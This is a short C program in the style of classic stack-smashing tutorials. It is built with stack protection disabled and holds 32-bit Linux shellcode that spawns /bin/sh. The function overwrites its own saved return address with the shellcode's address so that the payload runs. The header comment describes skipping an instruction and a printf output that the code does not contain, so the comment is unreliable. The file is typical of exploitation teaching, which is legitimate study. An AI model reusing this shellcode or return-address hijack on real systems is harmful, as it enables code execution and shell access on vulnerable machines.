// gcc -g -fno-stack-protector -z execstack -m32 testc.c -o testc

// NOTE: when executed we will skip the instruction right after the
// call to function and the printf() will print simply 0 instead of 1.

#include <stdio.h>
#include <string.h>

void function(int a, int b, int c) {
   char buffer1[32];
   int *ret;

   char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
     "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

   memset(buffer1, 'A', 32);

   ret = buffer1 + 12*4;
   (*ret) = shellcode;
}

void main() {
  function(1, 2, 3);
}
